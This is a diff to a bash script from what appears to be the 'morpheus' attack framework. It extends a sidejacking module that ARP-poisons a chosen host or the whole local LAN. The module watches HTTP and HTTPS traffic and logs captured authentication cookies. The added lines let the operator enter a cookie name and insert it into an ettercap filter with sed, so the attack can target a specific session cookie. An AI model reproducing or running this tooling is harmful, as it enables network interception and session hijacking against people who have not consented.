@@ -319,6 +319,8 @@ echo "${BlueF}    ╔───────────────────�
 echo "${BlueF}    | ${YellowF}    This module will display port 80(tcp) and port 443(https)     ${BlueF}|"
 echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
 echo "${BlueF}    | ${YellowF} If any auth cookie its captured And stored in 'sidejacking.log'  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  'Also this module allow users to input a cookie name to filter' ${BlueF}|"
 echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
@@ -331,16 +333,19 @@ echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
+
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid\nInput a cookie name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
+  sed -i "s|UsErInPut|$FiLteR|g" sidejacking.eft > /dev/null 2>&1
   cd $IPATH
   zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
